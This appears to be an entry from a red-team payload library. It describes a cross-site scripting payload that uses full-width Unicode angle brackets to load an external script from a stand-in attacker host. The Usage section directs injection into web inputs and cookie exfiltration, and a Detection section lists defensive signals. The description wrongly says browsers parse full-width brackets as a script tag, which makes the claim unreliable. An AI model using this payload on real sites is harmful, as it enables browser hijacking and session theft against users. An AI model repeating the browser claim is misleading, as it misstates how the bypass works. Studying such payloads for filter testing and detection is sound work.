---
id: 9228606b-7f4b-4f12-9791-2fce40b36d0f
name: Unicode-Fullwidth-Script-Tag-XSS-Payload
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.821983+00:00'
updated_at: '2023-04-10T20:21:52.695084+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - unicode-bypass
  - script-tag
validated: true
---

# Unicode-Fullwidth-Script-Tag-XSS-Payload

## Code

```javascript
＜script/src=//evil.site/poc.js＞
```

## Description

This JavaScript payload uses full-width Unicode angle brackets (U+FF1C and U+FF1E) to form a script tag that bypasses filters targeting standard < and > characters. When reflected into a web page, the browser interprets it as a valid external script inclusion, loading and executing poc.js from the attacker's domain. This enables arbitrary code execution in the victim's browser context.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| evil.site | Attacker-controlled domain hosting the malicious script | evil.com |
| poc.js | Path to the proof-of-concept or exploit script file | /steal.js |

## Usage

Inject this payload into vulnerable web inputs like search fields or comments. For example, submit it via a form POST or URL parameter. Ensure poc.js is hosted and contains the desired exploit (e.g., cookie exfiltration). Used in procedures like [[procedures/Unicode-Character-Injection-for-XSS-Filter-Bypass]] during testing or red team engagements to simulate XSS attacks.

## Detection

- Server-side logs showing unusual Unicode characters in input (e.g., U+FF1C).
- Client-side: CSP violations or anomalous script loads from external domains.
- Network monitoring for unexpected requests to attacker domains post-input submission.
- Browser dev tools revealing full-width tags in reflected content.

## Related

- [[procedures/Unicode-Character-Injection-for-XSS-Filter-Bypass]]
